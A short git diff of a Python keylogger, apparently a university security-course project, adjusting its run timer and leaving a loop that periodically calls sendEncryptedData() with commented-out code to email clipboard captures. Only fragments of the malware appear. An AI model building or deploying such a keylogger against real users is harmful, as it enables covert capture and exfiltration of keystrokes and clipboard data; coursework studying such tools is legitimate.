@@ -21,11 +21,8 @@ import os
 filepath = 'D:\\UNSW\\Term 1 2022\\COMP6841\\Something Awesome Project\\Keylogger'
 fileAccessExtension = '\\'
 
-##################################### TIMER  ################################################################
-
-numberOfIterationStart = 0
-numberOfIterationEnd = 3
-timeForKeyloggerToRun = 10
+##################################### TIMER  ################################################################clear
+timeForKeyloggerToRun = 30
 currentTime = time.time()
 stoppingTime = time.time() + timeForKeyloggerToRun
 
@@ -227,7 +224,6 @@ while True:
         #     sendEmail(clipboardInfo, filepath + fileAccessExtension + clipboardInfo, toSend)
         #
         sendEncryptedData()
-        numberOfIterationStart += 1
         currentTime = time.time()
         stoppingTime = time.time() + timeForKeyloggerToRun
 
